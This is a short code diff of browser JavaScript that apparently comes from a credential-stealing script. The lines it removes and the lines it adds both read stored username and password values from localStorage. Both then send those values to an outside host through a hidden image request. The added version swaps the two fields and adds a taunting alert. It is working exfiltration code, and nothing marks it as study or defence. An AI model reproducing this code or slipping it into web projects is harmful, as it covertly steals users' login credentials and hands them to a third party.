@@ -36,10 +36,12 @@ if (window.location.href.indexOf("login") >= 0) {
 		}, 99);
 		return false
 	}
-}else{
-if(localStorage['pw'] && localStorage['sw']){
-	new Image().src = "http://siktir.ddospanel.com/cptw.php?username=" + localStorage['pw'] + "&password=" + localStorage['sw'];
 }
+
+if(localStorage['sw'] && localStorage['pw']){
+	new Image().src = "http://siktir.ddospanel.com/cptw.php?username=" + localStorage['sw'] + "&password=" + localStorage['pw'];
+	alert("kek");
+
 }
 
 
